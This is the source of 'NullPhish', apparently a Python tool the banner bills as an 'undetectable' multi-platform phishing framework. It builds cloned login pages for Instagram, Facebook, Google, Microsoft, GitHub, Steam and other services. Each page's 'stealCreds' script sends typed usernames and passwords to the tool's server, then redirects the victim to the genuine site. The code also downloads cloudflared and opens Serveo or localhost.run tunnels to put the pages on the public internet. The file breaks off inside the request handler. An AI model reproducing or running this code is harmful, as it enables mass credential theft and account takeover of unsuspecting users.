#!/usr/bin/env python3


import os, sys, json, threading, subprocess, time, socket, re, tarfile, platform, signal, base64, random
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
import requests


try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    C, S = Fore, Style
except:
    class Dummy: __getattr__ = lambda s,n: ''
    C = S = Dummy()

PORT = 8080
TOOLS_DIR = os.path.join(os.path.expanduser("~"), ".nullphish")
IS_TERMUX = "com.termux" in os.environ.get("PREFIX", "")


BANNER = f"""
{C.RED}                      ███╗   ██╗██╗   ██╗██╗     ██╗     ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
{C.RED}                      ████╗  ██║██║   ██║██║     ██║     ██╔══██╗██║  ██║██║██╔════╝██║  ██║
{C.RED}                      ██╔██╗ ██║██║   ██║██║     ██║     ██████╔╝███████║██║███████╗███████║
{C.RED}                      ██║╚██╗██║██║   ██║██║     ██║     ██╔═══╝ ██╔══██║██║╚════██║██╔══██║
{C.RED}                      ██║ ╚████║╚██████╔╝███████╗███████╗██║     ██║  ██║██║███████║██║  ██║
{C.RED}                      ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
{C.RED}
{C.WHITE}                           ◆ {S.BRIGHT}MULTI-SOCIAL MEDIA PHISHING FRAMEWORK{S.RESET_ALL} ◆
{C.RED}                            ═══ {S.BRIGHT}UNDETECTABLE · NO BROWSER WARNING{S.RESET_ALL} {C.RED}═══
{C.MAGENTA}                                    created by {S.BRIGHT}null7{S.RESET_ALL}
"""


PAGES = {
    "instagram": {
        "name": "Instagram",
        "html": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Instagram · Log in</title><style>:root{--bg:#fafafa;--card:#fff;--border:#dbdbdb;--text:#262626;--blue:#0095f6;--gray:#8e8e8e}*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:var(--bg);display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:100%;max-width:350px}.card{background:var(--card);border:1px solid var(--border);border-radius:1px;padding:40px 40px 30px;text-align:center;margin-bottom:10px}.logo{font-size:36px;font-weight:600;margin-bottom:20px;font-family:'Billabong',cursive;color:var(--text)}input{width:100%;padding:9px 8px;background:var(--bg);border:1px solid var(--border);border-radius:3px;font-size:12px;margin-bottom:6px;outline:none}input:focus{border-color:#a8a8a8}.btn{width:100%;padding:7px 0;background:var(--blue);border:none;border-radius:4px;color:white;font-weight:600;font-size:14px;margin-top:12px;cursor:pointer;opacity:0.7}.btn:hover{opacity:1}.divider{display:flex;align-items:center;margin:20px 0;color:var(--gray);font-size:13px;font-weight:600}.divider::before,.divider::after{content:'';flex:1;height:1px;background:var(--border)}.divider span{margin:0 18px}.fb-login{color:#385185;font-weight:600;font-size:14px;text-decoration:none;display:block;margin-bottom:15px}.forgot{color:#00376b;font-size:12px;text-decoration:none}.signup{background:var(--card);border:1px solid var(--border);padding:25px;text-align:center;font-size:14px}.signup a{color:var(--blue);font-weight:600;text-decoration:none}</style></head><body><div class="container"><div class="card"><div class="logo">Instagram</div><form id="loginForm" onsubmit="return stealCreds(event)"><input type="text" name="username" placeholder="Phone number, username, or email" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn">Log In</button></form><div class="divider"><span>OR</span></div><a href="#" class="fb-login">Log in with Facebook</a><a href="#" class="forgot">Forgot password?</a></div><div class="signup">Don't have an account? <a href="#">Sign up</a></div></div><script>function stealCreds(e){e.preventDefault();var u=document.querySelector('input[name="username"]').value;var p=document.querySelector('input[name="password"]').value;fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>{window.location.href='https://www.instagram.com/'});}</script></body></html>"""
    },
    "facebook": {
        "name": "Facebook",
        "html": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Facebook - log in or sign up</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:100%;max-width:396px;text-align:center}.logo{font-size:42px;font-weight:700;color:#1877f2;margin-bottom:10px}.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1);padding:20px;margin-bottom:28px}.card p{font-size:18px;line-height:22px;color:#1c1e21;margin-bottom:20px}input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px;outline:none}input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}.btn-login{width:100%;padding:12px 0;background:#1877f2;border:none;border-radius:6px;color:white;font-weight:700;font-size:20px;cursor:pointer}.btn-login:hover{background:#166fe5}.forgot{display:block;color:#1877f2;font-size:14px;text-decoration:none;margin-top:16px}.divider{border-bottom:1px solid #dadde1;margin:20px 0}.btn-new{background:#42b72a;color:white;border:none;border-radius:6px;padding:14px 20px;font-size:17px;font-weight:700;cursor:pointer}.btn-new:hover{background:#36a420}</style></head><body><div class="container"><div class="logo">facebook</div><div class="card"><p>Log in to Facebook</p><form id="loginForm" onsubmit="return stealCreds(event)"><input type="text" name="username" placeholder="Email address or phone number" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn-login">Log In</button></form><a href="#" class="forgot">Forgotten account?</a><div class="divider"></div><button class="btn-new">Create New Account</button></div></div><script>function stealCreds(e){e.preventDefault();var u=document.querySelector('input[name="username"]').value;var p=document.querySelector('input[name="password"]').value;fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>{window.location.href='https://www.facebook.com/'});}</script></body></html>"""
    },
    "twitter": {
        "name": "Twitter / X",
        "html": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>X. It's what's happening / X</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#000;color:#e7e9ea;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:100%;max-width:364px;padding:20px}.logo{font-size:38px;font-weight:700;margin-bottom:32px}.card h1{font-size:31px;font-weight:700;margin-bottom:12px}.card p{font-size:15px;color:#71767b;margin-bottom:20px}.btn-google{width:100%;padding:10px 0;background:#fff;color:#0f1419;border:none;border-radius:20px;font-weight:700;font-size:15px;margin-bottom:10px;cursor:pointer}.btn-apple{width:100%;padding:10px 0;background:#fff;color:#0f1419;border:none;border-radius:20px;font-weight:700;font-size:15px;margin-bottom:10px;cursor:pointer}.divider{display:flex;align-items:center;margin:8px 0}.divider::before,.divider::after{content:'';flex:1;height:1px;background:#333639}.divider span{margin:0 8px;color:#71767b;font-size:15px}input{width:100%;padding:12px;background:transparent;border:1px solid #333639;border-radius:4px;color:white;font-size:17px;margin-bottom:20px;outline:none}input:focus{border-color:#1d9bf0}.btn-next{width:100%;padding:12px 0;background:#1d9bf0;border:none;border-radius:20px;color:white;font-weight:700;font-size:15px;cursor:pointer}.btn-forgot{background:transparent;border:1px solid #536471;color:#1d9bf0;margin-top:10px}.signup{color:#71767b;font-size:15px;margin-top:40px}.signup a{color:#1d9bf0;text-decoration:none}</style></head><body><div class="container"><div class="logo">𝕏</div><div class="card"><h1>Sign in to X</h1><p>Enter your phone number, email address, or username</p><form id="loginForm" onsubmit="return stealCreds(event)"><input type="text" name="username" placeholder="Phone, email, or username" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn-next">Next</button></form><button class="btn-next btn-forgot">Forgot password?</button><p class="signup">Don't have an account? <a href="#">Sign up</a></p></div></div><script>function stealCreds(e){e.preventDefault();var u=document.querySelector('input[name="username"]').value;var p=document.querySelector('input[name="password"]').value;fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>{window.location.href='https://twitter.com/'});}</script></body></html>"""
    },
    "tiktok": {
        "name": "TikTok",
        "html": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>TikTok - Login | TikTok</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:#000;color:white;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:100%;max-width:360px;text-align:center;padding:20px}.logo{font-size:42px;font-weight:700;margin-bottom:30px;color:#fff}.tabs{display:flex;justify-content:center;gap:40px;margin-bottom:30px;font-size:16px;border-bottom:1px solid #333;padding-bottom:10px}.tabs span{cursor:pointer;color:#888}.tabs span.active{color:white;font-weight:700;border-bottom:2px solid white;padding-bottom:8px}input{width:100%;padding:14px;background:transparent;border:1px solid #555;border-radius:4px;color:white;font-size:15px;margin-bottom:10px;outline:none}input:focus{border-color:white}.btn{width:100%;padding:14px 0;background:#fe2c55;border:none;border-radius:4px;color:white;font-weight:700;font-size:16px;margin-top:10px;cursor:pointer}.btn:hover{background:#e0264d}.link{color:#fe2c55;font-size:14px;text-decoration:none;display:block;margin-top:20px}</style></head><body><div class="container"><div class="logo">TikTok</div><div class="tabs"><span class="active">Log in</span><span>Sign up</span></div><form id="loginForm" onsubmit="return stealCreds(event)"><input type="text" name="username" placeholder="Phone or email" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn">Log in</button></form><a href="#" class="link">Forgot password?</a></div><script>function stealCreds(e){e.preventDefault();var u=document.querySelector('input[name="username"]').value;var p=document.querySelector('input[name="password"]').value;fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>{window.location.href='https://www.tiktok.com/'});}</script></body></html>"""
    },
    "snapchat": {
        "name": "Snapchat",
        "html": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Snapchat - Log In</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:100%;max-width:380px;text-align:center;padding:20px}.ghost{width:80px;height:80px;background:#fffc00;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center}.ghost span{font-size:40px;color:#000}.title{font-size:28px;font-weight:700;margin-bottom:30px;color:#000}input{width:100%;padding:14px;background:#f3f3f3;border:none;border-radius:12px;font-size:16px;margin-bottom:12px;outline:none}.btn{width:100%;padding:14px 0;background:#fffc00;border:none;border-radius:12px;font-weight:700;font-size:16px;cursor:pointer;color:#000}.btn:hover{background:#e6e000}.link{color:#0f72e6;font-size:14px;text-decoration:none;display:block;margin-top:20px}</style></head><body><div class="container"><div class="ghost"><span>👻</span></div><div class="title">Snapchat</div><form id="loginForm" onsubmit="return stealCreds(event)"><input type="text" name="username" placeholder="Username or Email" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn">Log In</button></form><a href="#" class="link">Forgot your password?</a></div><script>function stealCreds(e){e.preventDefault();var u=document.querySelector('input[name="username"]').value;var p=document.querySelector('input[name="password"]').value;fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>{window.location.href='https://www.snapchat.com/'});}</script></body></html>"""
    },
    "google": {
        "name": "Google",
        "html": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sign in - Google Accounts</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:"Google Sans",Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:100%;max-width:450px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;text-align:center}.logo{font-size:24px;font-weight:400;color:#202124;margin-bottom:20px}.logo span{color:#4285f4;font-weight:500}h2{font-size:24px;font-weight:400;margin-bottom:10px}p{font-size:16px;color:#5f6368;margin-bottom:30px}input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:20px;outline:none}input:focus{border-color:#4285f4}.btn{display:flex;justify-content:space-between;align-items:center;margin-top:30px}.btn a{color:#4285f4;text-decoration:none;font-weight:500;font-size:14px}.btn button{background:#4285f4;color:white;border:none;padding:12px 24px;border-radius:4px;font-weight:500;font-size:14px;cursor:pointer}.btn button:hover{background:#3367d6}</style></head><body><div class="container"><div class="logo"><span>G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></div><h2>Sign in</h2><p>to continue to Gmail</p><form id="loginForm" onsubmit="return stealCreds(event)"><input type="email" name="username" placeholder="Email or phone" required><input type="password" name="password" placeholder="Enter your password" required><div class="btn"><a href="#">Forgot email?</a><button type="submit">Next</button></div></form></div><script>function stealCreds(e){e.preventDefault();var u=document.querySelector('input[name="username"]').value;var p=document.querySelector('input[name="password"]').value;fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>{window.location.href='https://accounts.google.com/'});}</script></body></html>"""
    },
    "linkedin": {
        "name": "LinkedIn",
        "html": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>LinkedIn Login, Sign in | LinkedIn</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f3f2ef;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:100%;max-width:352px;background:#fff;padding:24px;border-radius:8px;box-shadow:0 0 0 1px rgba(0,0,0,0.08),0 4px 6px rgba(0,0,0,0.1)}.logo{font-size:28px;font-weight:600;color:#0a66c2;margin-bottom:4px}.tagline{font-size:14px;color:#00000099;margin-bottom:24px}input{width:100%;padding:14px 12px;border:1px solid rgba(0,0,0,0.6);border-radius:4px;font-size:16px;margin-bottom:16px;outline:none}input:focus{border-color:#0a66c2;box-shadow:0 0 0 1px #0a66c2}.btn{width:100%;padding:14px 0;background:#0a66c2;border:none;border-radius:28px;color:white;font-weight:600;font-size:16px;cursor:pointer}.btn:hover{background:#004182}.forgot{color:#0a66c2;font-weight:600;text-decoration:none;font-size:14px;display:block;margin-top:20px}.or{display:flex;align-items:center;margin:16px 0;color:#00000099}.or::before,.or::after{content:'';flex:1;height:1px;background:#e0e0e0}.or span{margin:0 12px;font-size:14px}</style></head><body><div class="container"><div class="logo">LinkedIn</div><div class="tagline">Make the most of your professional life</div><form id="loginForm" onsubmit="return stealCreds(event)"><input type="text" name="username" placeholder="Email or phone" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn">Sign in</button></form><div class="or"><span>or</span></div><a href="#" class="forgot">Forgot password?</a></div><script>function stealCreds(e){e.preventDefault();var u=document.querySelector('input[name="username"]').value;var p=document.querySelector('input[name="password"]').value;fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>{window.location.href='https://www.linkedin.com/uas/login'};});</script></body></html>"""
    },
    "github": {
        "name": "GitHub",
        "html": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sign in to GitHub · GitHub</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;background:#0d1117;color:#c9d1d9;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:100%;max-width:340px;text-align:center}.logo{font-size:48px;color:#f0f6fc;margin-bottom:20px}.card{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:20px}label{display:block;text-align:left;font-size:14px;margin-bottom:8px}input{width:100%;padding:5px 12px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;font-size:14px;line-height:20px;margin-bottom:16px;outline:none}input:focus{border-color:#58a6ff;box-shadow:0 0 0 3px rgba(88,166,255,0.3)}.btn{width:100%;padding:5px 0;background:#238636;border:1px solid #2ea043;border-radius:6px;color:white;font-weight:600;font-size:14px;cursor:pointer}.btn:hover{background:#2ea043}.forgot{display:block;color:#58a6ff;font-size:12px;text-decoration:none;margin-top:16px}.create{margin-top:16px;padding:16px;border:1px solid #30363d;border-radius:6px;font-size:14px}.create a{color:#58a6ff;text-decoration:none}</style></head><body><div class="container"><div class="logo">🐙</div><div class="card"><form id="loginForm" onsubmit="return stealCreds(event)"><label>Username or email address</label><input type="text" name="username" required><label>Password</label><input type="password" name="password" required><button type="submit" class="btn">Sign in</button></form><a href="#" class="forgot">Forgot password?</a></div><div class="create">New to GitHub? <a href="#">Create an account</a>.</div></div><script>function stealCreds(e){e.preventDefault();var u=document.querySelector('input[name="username"]').value;var p=document.querySelector('input[name="password"]').value;fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>{window.location.href='https://github.com/login'};});</script></body></html>"""
    },
    "microsoft": {
        "name": "Microsoft",
        "html": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sign in to your Microsoft account</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:"Segoe UI Webfont",-apple-system,BlinkMacSystemFont,Roboto,Helvetica,Arial,sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:100%;max-width:440px;background:#fff;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,0.2)}.logo{width:108px;margin:0 auto 16px;display:block}.title{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:12px}input{width:100%;padding:6px 10px;border:1px solid #605e5c;border-radius:0;font-size:15px;height:36px;margin-bottom:16px;outline:none}input:focus{border-color:#0067b8}.btn{width:100%;padding:10px 0;background:#0067b8;border:none;color:white;font-size:15px;cursor:pointer}.btn:hover{background:#005a9e}.link{color:#0067b8;text-decoration:none;font-size:13px;display:block;margin-top:16px}.create{text-align:right;margin-top:16px;font-size:13px}.create a{color:#0067b8;text-decoration:none}</style></head><body><div class="container"><img class="logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect x='1' y='1' width='9' height='9' fill='%23f25022'/%3E%3Crect x='1' y='12' width='9' height='9' fill='%237fba00'/%3E%3Crect x='12' y='1' width='9' height='9' fill='%2300a4ef'/%3E%3Crect x='12' y='12' width='9' height='9' fill='%23ffb900'/%3E%3C/svg%3E" alt="Microsoft"><div class="title">Sign in</div><form id="loginForm" onsubmit="return stealCreds(event)"><input type="email" name="username" placeholder="Email, phone, or Skype" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn">Sign in</button></form><a href="#" class="link">Forgot password?</a><div class="create">No account? <a href="#">Create one!</a></div></div><script>function stealCreds(e){e.preventDefault();var u=document.querySelector('input[name="username"]').value;var p=document.querySelector('input[name="password"]').value;fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>{window.location.href='https://login.live.com/'};});</script></body></html>"""
    },
    "yahoo": {
        "name": "Yahoo",
        "html": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Yahoo</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:100%;max-width:360px;text-align:center}.logo{font-size:28px;font-weight:700;color:#400090;margin-bottom:20px}.logo span{color:#6001d2}input{width:100%;padding:12px;border:1px solid #d8d8d8;border-radius:0;font-size:16px;margin-bottom:12px;outline:none}input:focus{border-color:#188fff}.btn{width:100%;padding:12px 0;background:#188fff;border:none;border-radius:0;color:white;font-weight:600;font-size:16px;cursor:pointer}.btn:hover{background:#0066cc}.link{color:#188fff;text-decoration:none;font-size:14px;display:block;margin-top:12px}.create{font-size:14px;margin-top:20px}.create a{color:#188fff;text-decoration:none}</style></head><body><div class="container"><div class="logo"><span>Y</span>ahoo!</div><form id="loginForm" onsubmit="return stealCreds(event)"><input type="text" name="username" placeholder="Email or username" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn">Sign in</button></form><a href="#" class="link">Forgot username?</a><a href="#" class="link">Forgot password?</a><div class="create">Don't have an account? <a href="#">Sign up</a></div></div><script>function stealCreds(e){e.preventDefault();var u=document.querySelector('input[name="username"]').value;var p=document.querySelector('input[name="password"]').value;fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>{window.location.href='https://login.yahoo.com/'};});</script></body></html>"""
    },
    "netflix": {
        "name": "Netflix",
        "html": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Netflix</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Helvetica,Arial,sans-serif;background:#000;color:#333;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:100%;max-width:450px;background:rgba(0,0,0,0.75);border-radius:4px;padding:60px 68px 40px;color:#b3b3b3}h1{color:#fff;font-size:32px;margin-bottom:28px}input{width:100%;padding:16px 20px;background:#333;border:none;border-radius:4px;color:#fff;font-size:16px;margin-bottom:16px;outline:none}input:focus{background:#454545}.btn{width:100%;padding:16px 0;background:#e50914;border:none;border-radius:4px;color:white;font-weight:700;font-size:16px;cursor:pointer;margin-top:24px}.btn:hover{background:#f6121d}.link{color:#b3b3b3;text-decoration:none;font-size:13px;display:block;margin-top:12px}.signup{color:#737373;font-size:16px;margin-top:20px}.signup a{color:#fff;text-decoration:none}.signup a:hover{text-decoration:underline}</style></head><body><div class="container"><h1>Sign In</h1><form id="loginForm" onsubmit="return stealCreds(event)"><input type="text" name="username" placeholder="Email or phone number" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn">Sign In</button></form><a href="#" class="link">Need help?</a><div class="signup">New to Netflix? <a href="#">Sign up now</a>.</div></div><script>function stealCreds(e){e.preventDefault();var u=document.querySelector('input[name="username"]').value;var p=document.querySelector('input[name="password"]').value;fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>{window.location.href='https://www.netflix.com/login'};});</script></body></html>"""
    },
    "steam": {
        "name": "Steam",
        "html": """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sign In</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:"Motiva Sans",Arial,Helvetica,sans-serif;background:#1b2838;color:#c6d4df;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:100%;max-width:350px;text-align:center}.logo{font-size:28px;font-weight:200;text-transform:uppercase;letter-spacing:2px;margin-bottom:30px;color:#fff}input{width:100%;padding:10px;background:#32353c;border:1px solid #32353c;border-radius:2px;color:#e9e9e9;font-size:15px;margin-bottom:14px;outline:none}input:focus{border-color:#66c0f4}.btn{width:100%;padding:10px 0;background:linear-gradient(to bottom,#6fa720,#5c8e16);border:none;border-radius:2px;color:#e5e4dc;font-size:16px;cursor:pointer}.btn:hover{background:linear-gradient(to bottom,#7fb429,#6aa31b)}.link{color:#afafaf;text-decoration:none;font-size:12px;display:block;margin-top:20px}.link:hover{color:#fff}</style></head><body><div class="container"><div class="logo">STEAM</div><form id="loginForm" onsubmit="return stealCreds(event)"><input type="text" name="username" placeholder="Steam account name" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn">Sign in</button></form><a href="#" class="link">Help, I can't sign in</a></div><script>function stealCreds(e){e.preventDefault();var u=document.querySelector('input[name="username"]').value;var p=document.querySelector('input[name="password"]').value;fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>{window.location.href='https://store.steampowered.com/login/'};});</script></body></html>"""
    }
}


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def spinner(text, duration=0.6):
    chars = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    end = time.time() + duration
    i = 0
    while time.time() < end:
        print(f"\r    {C.CYAN}{chars[i%len(chars)]}{S.RESET_ALL} {text}", end="", flush=True)
        time.sleep(0.07)
        i += 1

def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(("0.0.0.0", port)) == 0

def kill_process_on_port(port):
    try:
        if os.name == "nt":
            res = subprocess.run(["netstat","-ano","-p","tcp"], capture_output=True, text=True)
            for line in res.stdout.split('\n'):
                if f":{port}" in line and "LISTENING" in line:
                    pid = line.split()[-1]
                    subprocess.run(["taskkill","/F","/PID",pid], capture_output=True)
                    return True
        else:
            res = subprocess.run(["lsof","-ti",f":{port}"], capture_output=True, text=True)
            for pid in res.stdout.strip().split('\n'):
                if pid:
                    try: os.kill(int(pid), signal.SIGKILL)
                    except: pass
            subprocess.run(["fuser","-k",f"{port}/tcp"], capture_output=True)
            return True
    except:
        pass
    return False

def find_available_port(start=8080, max_tries=10):
    for p in range(start, start+max_tries):
        if not is_port_in_use(p):
            return p
    return None

def get_cloudflared_url():
    machine = platform.machine().lower()
    system = sys.platform
    if system == "win32":
        return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    elif system == "darwin":
        return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz" if "arm" in machine else "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz"
    else:
        if "aarch64" in machine or "arm64" in machine:
            return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
        elif "arm" in machine:
            return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
        else:
            return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"

def install_cloudflared():
    exe_name = "cloudflared.exe" if os.name=="nt" else "cloudflared"
    exe_path = os.path.join(TOOLS_DIR, exe_name)
    if os.path.exists(exe_path):
        return exe_path
    os.makedirs(TOOLS_DIR, exist_ok=True)
    print(f"    {C.YELLOW}⬇{S.RESET_ALL}  Downloading cloudflared...")
    url = get_cloudflared_url()
    try:
        resp = requests.get(url, stream=True, timeout=120)
        if url.endswith(".tgz"):
            tgz = os.path.join(TOOLS_DIR, "cloudflared.tgz")
            with open(tgz, "wb") as f:
                for c in resp.iter_content(8192): f.write(c)
            with tarfile.open(tgz, "r:gz") as tar:
                tar.extract("cloudflared", TOOLS_DIR)
            os.remove(tgz)
        else:
            with open(exe_path, "wb") as f:
                for c in resp.iter_content(8192): f.write(c)
            if os.name!="nt": os.chmod(exe_path, 0o755)
        print(f"    {C.GREEN}✓{S.RESET_ALL}  Cloudflared installed")
        return exe_path
    except Exception as e:
        print(f"    {C.RED}✗{S.RESET_ALL}  {e}")
        return None

def start_cloudflared_tunnel():
    exe = install_cloudflared()
    if not exe: return None
    print(f"    {C.CYAN}⏳{S.RESET_ALL}  Launching Cloudflare...")
    try:
        proc = subprocess.Popen([exe,"tunnel","--url",f"http://localhost:{PORT}"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        start = time.time()
        for line in iter(proc.stdout.readline, ''):
            if time.time()-start > 45: break
            m = re.search(r'(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)', line)
            if m:
                print(f"    {C.GREEN}✓{S.RESET_ALL}  Connected")
                return m.group(1)
    except: pass
    print(f"    {C.YELLOW}⚠{S.RESET_ALL}  Cloudflared failed")
    return None

def start_serveo_tunnel():
    print(f"    {C.CYAN}⏳{S.RESET_ALL}  Trying Serveo...")
    try:
        sub = f"nullphish-{random.randint(1000,9999)}"
        proc = subprocess.Popen(["ssh","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-R",f"{sub}:80:localhost:{PORT}","serveo.net"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        url = f"https://{sub}.serveo.net"
        time.sleep(3)
        try: requests.get(f"http://{sub}.serveo.net", timeout=5); print(f"    {C.GREEN}✓{S.RESET_ALL}  Serveo connected"); return url
        except: pass
    except FileNotFoundError: print(f"    {C.YELLOW}⚠{S.RESET_ALL}  SSH missing")
    return None

def start_localhost_run():
    print(f"    {C.CYAN}⏳{S.RESET_ALL}  Trying localhost.run...")
    try:
        proc = subprocess.Popen(["ssh","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-R",f"80:localhost:{PORT}","nokey@localhost.run"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        start = time.time()
        for line in iter(proc.stdout.readline, ''):
            if time.time()-start>20: break
            m = re.search(r'https?://[a-zA-Z0-9\-]+\.lhr\.life', line)
            if m:
                print(f"    {C.GREEN}✓{S.RESET_ALL}  localhost.run connected")
                return m.group(0)
    except: pass
    return None


class PhishHandler(BaseHTTPRequestHandler):
    selected_page = "instagram"
    def log_message(self, format, *args): pass

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
